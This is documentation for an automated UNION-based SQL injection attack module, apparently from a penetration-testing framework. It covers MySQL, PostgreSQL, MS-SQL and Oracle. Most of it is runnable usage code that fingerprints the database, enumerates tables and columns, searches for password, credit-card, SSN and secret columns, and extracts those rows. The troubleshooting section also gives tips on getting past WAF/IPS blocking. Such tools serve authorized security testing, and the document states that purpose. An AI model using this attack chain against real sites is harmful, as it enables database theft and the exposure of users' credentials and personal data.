# UNION-Based SQL Injection Attack Module

## Overview

The UNION-based SQL injection attack module (`sql_attacker/union_sql_injection.py`) provides advanced, fully automated techniques for exploiting UNION-based SQL injection vulnerabilities. This module supports multiple database management systems and automates the entire attack chain from column discovery to data extraction.

## Supported Database Systems

- **MySQL** - Full support with MySQL-specific functions (CONCAT, VERSION, etc.)
- **PostgreSQL** - Full support with PostgreSQL-specific functions (pg_sleep, version, etc.)
- **Microsoft SQL Server (MS-SQL)** - Full support with T-SQL syntax (WAITFOR, SYSTEM_USER, etc.)
- **Oracle** - Full support with Oracle-specific syntax (all_tables, all_tab_columns, etc.)

## Key Features

### 1. Column Count Discovery

Automatically discovers the required number of columns for successful UNION attacks by:
- Incrementally adding NULL values in SELECT statements
- Testing with different SQL comment styles (--, #, /*)
- Detecting successful injection based on response analysis
- Identifying which columns display output in the response

**Example:**
```python
column_count = attacker.discover_column_count()
print(f"Discovered {column_count} columns")
# Output: Discovered 3 columns
```

### 2. Metadata Mining

Queries database metadata to discover:
- **Table names** from `information_schema.tables` (MySQL, PostgreSQL, MS-SQL) or `all_tables` (Oracle)
- **Column names** from `information_schema.columns` or `all_tab_columns`
- **Column data types** and other metadata
- **Filtered searches** using SQL LIKE patterns

**Example:**
```python
# Discover all tables
tables = attacker.discover_tables()

# Discover tables matching a pattern
user_tables = attacker.discover_tables(pattern='%user%')

# Discover columns in a specific table
columns = attacker.discover_columns('users')

# Search for password-related columns
pass_columns = attacker.discover_columns('users', pattern='%pass%')
```

### 3. DBMS-Adaptive Queries

The module automatically adapts queries based on the detected DBMS:

| Feature | MySQL | PostgreSQL | MS-SQL | Oracle |
|---------|-------|------------|--------|--------|
| String Concat | `CONCAT()` | `\|\|` | `+` | `\|\|` |
| Limit Results | `LIMIT n` | `LIMIT n` | `TOP n` | `ROWNUM <= n` |
| Version Function | `VERSION()` | `version()` | `@@version` | `v$version` |
| Schema Tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |

### 4. Data Extraction

Extract actual data from discovered tables:
- Retrieve multiple columns simultaneously
- Filter results with WHERE clauses
- Limit number of results
- Parse and structure extracted data

**Example:**
```python
# Extract username and password columns from users table
data = attacker.extract_data(
    table='users',
    columns=['username', 'password'],
    where_clause='active=1',
    limit=10
)

for row in data:
    print(f"User: {row['username']}, Pass: {row['password']}")
```

### 5. Sensitive Data Discovery

Automatically search for potentially sensitive columns across all tables:
- Password fields (pass, pwd, password, etc.)
- Credit card information
- Social Security Numbers (SSN)
- Secret keys and tokens
- Email addresses

**Example:**
```python
sensitive = attacker.search_sensitive_columns(
    patterns=['%pass%', '%credit%', '%ssn%', '%secret%']
)

for table, columns in sensitive.items():
    print(f"Table '{table}' contains sensitive data:")
    for col in columns:
        print(f"  - {col['column_name']} ({col['data_type']})")
```

## Architecture

### Class: `UnionSQLInjectionAttacker`

The main class that orchestrates UNION-based attacks.

#### Initialization

```python
def __init__(self, 
             send_request_callback: Callable,
             dbms_type: Optional[DBMSType] = None,
             max_columns: int = 20,
             delay: float = 0.5)
```

**Parameters:**
- `send_request_callback`: Function for sending HTTP requests. Must accept `(url, params_dict)` and return `(response_body, status_code, headers)`.
- `dbms_type`: Optional DBMS type. If not provided, will attempt auto-detection.
- `max_columns`: Maximum columns to test during discovery (default: 20).
- `delay`: Delay between requests in seconds to avoid rate limiting (default: 0.5).

#### Key Methods

##### `set_target(url, injection_point)`
Set the target URL and parameter to inject into.

##### `discover_column_count(start_count=1)`
Automatically discover the number of columns needed for UNION attacks.

##### `detect_dbms()`
Attempt to detect the database management system type.

##### `discover_tables(schema=None, pattern=None)`
Enumerate table names in the database.

##### `discover_columns(table_name, schema=None, pattern=None)`
Enumerate column names for a specific table.

##### `extract_data(table, columns, where_clause=None, limit=100)`
Extract actual data from a table.

##### `search_sensitive_columns(patterns=None)`
Search for potentially sensitive columns across all tables.

## Usage Guide

### Basic Attack Flow

```python
from sql_attacker.union_sql_injection import UnionSQLInjectionAttacker, DBMSType
import requests

# Define request function
def send_http_request(url, params):
    """Send HTTP request and return response details."""
    try:
        response = requests.get(url, params=params, timeout=10)
        return response.text, response.status_code, dict(response.headers)
    except Exception as e:
        return str(e), 500, {}

# Initialize attacker
attacker = UnionSQLInjectionAttacker(
    send_request_callback=send_http_request,
    max_columns=15,
    delay=0.5
)

# Set target
attacker.set_target("http://vulnerable-site.com/product?id=1")

# Step 1: Detect DBMS
dbms = attacker.detect_dbms()
print(f"Detected DBMS: {dbms.value}")

# Step 2: Discover column count
column_count = attacker.discover_column_count()
if not column_count:
    print("Could not discover column count")
    exit(1)
print(f"Column count: {column_count}")

# Step 3: Discover tables
print("\n--- Discovering Tables ---")
tables = attacker.discover_tables()
for table in tables[:10]:  # Show first 10
    print(f"  - {table}")

# Step 4: Discover columns in interesting tables
if 'users' in [t.lower() for t in tables]:
    print("\n--- Columns in 'users' table ---")
    columns = attacker.discover_columns('users')
    for col in columns:
        print(f"  - {col['column_name']} ({col['data_type']})")
    
    # Step 5: Extract data
    if columns:
        print("\n--- Extracting User Data ---")
        col_names = [c['column_name'] for c in columns[:5]]
        data = attacker.extract_data('users', col_names, limit=5)
        for row in data:
            print(row)
```

### Advanced Usage: Targeted Data Extraction

```python
# Search for specific sensitive data
print("\n--- Searching for Credentials ---")
sensitive = attacker.search_sensitive_columns(
    patterns=['%username%', '%user%', '%email%', '%pass%', '%pwd%']
)

for table, columns in sensitive.items():
    print(f"\nTable: {table}")
    
    # Extract column names
    col_names = [c['column_name'] for c in columns]
    
    # Extract actual data
    try:
        data = attacker.extract_data(table, col_names, limit=10)
        for row in data:
            print(f"  {row}")
    except Exception as e:
        print(f"  Error extracting data: {e}")
```

### Integration with Existing Code

The module is designed to integrate seamlessly with existing SQL injection detection code:

```python
from sql_attacker.union_sql_injection import UnionSQLInjectionAttacker

# If you've detected a SQL injection vulnerability
if vulnerability_detected:
    # Initialize UNION attacker for exploitation
    attacker = UnionSQLInjectionAttacker(
        send_request_callback=your_request_function
    )
    
    # Set the vulnerable endpoint
    attacker.set_target(vulnerable_url)
    
    # Exploit the vulnerability
    if attacker.discover_column_count():
        tables = attacker.discover_tables()
        # Continue with exploitation...
```

## Request Function Interface

The module requires a request function that follows this interface:

```python
def send_request(url: str, params: Optional[Dict]) -> Tuple[str, int, Dict]:
    """
    Send HTTP request and return response.
    
    Args:
        url: Full URL to request
        params: Optional query parameters (dict)
    
    Returns:
        Tuple of (response_body, status_code, headers_dict)
    """
    # Implementation using requests, urllib, or any HTTP library
    pass
```

### Example with requests library:
```python
import requests

def send_request(url, params):
    response = requests.get(url, params=params, timeout=10)
    return response.text, response.status_code, dict(response.headers)
```

### Example with urllib:
```python
from urllib.request import urlopen
from urllib.parse import urlencode

def send_request(url, params):
    if params:
        url = f"{url}?{urlencode(params)}"
    response = urlopen(url, timeout=10)
    body = response.read().decode('utf-8')
    status = response.status
    headers = dict(response.headers)
    return body, status, headers
```

## Attack Methodology

### Phase 1: Reconnaissance
1. **Set target** - Identify vulnerable parameter
2. **Detect DBMS** - Fingerprint database type
3. **Baseline capture** - Record normal response

### Phase 2: Column Discovery
1. **Test columns** - Start with 1 NULL, increment up to max_columns
2. **Try comment styles** - Test --, #, /* for each column count
3. **Detect success** - Look for absence of errors and response changes
4. **Identify injectable** - Determine which columns display in output

### Phase 3: Metadata Enumeration
1. **Discover tables** - Query information_schema or all_tables
2. **Discover columns** - Query column metadata for each table
3. **Search sensitive** - Pattern match for credentials, PII, etc.

### Phase 4: Data Extraction
1. **Build queries** - Construct UNION queries with proper column count
2. **Extract data** - Pull actual records from discovered tables
3. **Parse results** - Extract data from HTTP responses

## Security and Ethical Considerations

### Important Notes:
- This module is for **authorized security testing only**
- Requires **explicit permission** before testing any system
- Designed for **educational and research purposes**
- Should be used in **controlled testing environments**

### Responsible Use:
1. Obtain written authorization before testing
2. Test only systems you own or have permission to test
3. Use appropriate rate limiting (delay parameter)
4. Document all findings professionally
5. Report vulnerabilities responsibly

## Troubleshooting

### Column count not discovered
- **Increase max_columns**: Some applications use many columns
- **Check baseline**: Ensure target is reachable and returns valid response
- **Try manual payloads**: Test with known working UNION payloads
- **Review errors**: Enable debug logging to see what's failing

### No injectable columns found
- Output may not be visible in response
- Try alternative extraction methods (error-based, blind)
- Check if output is JSON/XML encoded
- Look for indirect indicators in response

### DBMS detection fails
- Manually specify DBMS type in initialization
- Try forcing specific DBMS syntax
- Check for WAF/IPS blocking fingerprinting attempts
- Use stealth mode with increased delays

### No data extracted
- Verify column names are correct (case-sensitive on some DBMS)
- Check if table/schema names need quotes
- Try simpler queries first (SELECT 1)
- Enable verbose logging for debugging

## Extension Guide

### Adding Support for New DBMS

To add support for a new database system:

1. Add to `DBMSType` enum:
```python
class DBMSType(Enum):
    # ... existing types ...
    NEWDB = "newdb"
```

2. Add fingerprinting payloads in `detect_dbms()`:
```python
fingerprints = [
    # ... existing fingerprints ...
    (DBMSType.NEWDB, ["' AND newdb_function()='true'--"]),
]
```

3. Update `_get_concat_function()`:
```python
if self.dbms_type == DBMSType.NEWDB:
    return f"CONCAT_FUNC({','.join(parts)})"
```

4. Update metadata queries in `discover_tables()` and `discover_columns()`

### Customizing Result Extraction

Override `_extract_results_from_response()` for application-specific parsing:

```python
class CustomUnionAttacker(UnionSQLInjectionAttacker):
    def _extract_results_from_response(self, response_body):
        # Custom parsing logic for your target application
        import json
        try:
            data = json.loads(response_body)
            return data.get('results', [])
        except:
            return super()._extract_results_from_response(response_body)
```

## Testing

### Unit Tests

Run the test suite:
```bash
python -m unittest sql_attacker.test_union_sql_injection
```

### Manual Testing

Use the included examples:
```bash
python sql_attacker/union_sql_injection.py
```

### Integration Testing

Test with a vulnerable application (e.g., DVWA, WebGoat):
```python
attacker = UnionSQLInjectionAttacker(send_request_callback=requests_function)
attacker.set_target("http://localhost/dvwa/vulnerabilities/sqli/?id=1")
# ... continue with attack
```

## Performance Considerations

- **Delay parameter**: Adjust based on target application and network
- **max_columns**: Lower values speed up discovery but may miss complex queries
- **Rate limiting**: Implement exponential backoff for stability
- **Caching**: Cache discovered tables/columns to avoid repeated queries
- **Parallel requests**: Future enhancement for faster enumeration

## References

- OWASP SQL Injection Guide: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- SQLMAP Documentation: http://sqlmap.org/

## Support and Contribution

For issues, questions, or contributions:
- Open an issue on the GitHub repository
- Follow coding standards in the existing codebase
- Include tests for new features
- Update documentation for changes

## License

This module is part of the Megido security testing framework.
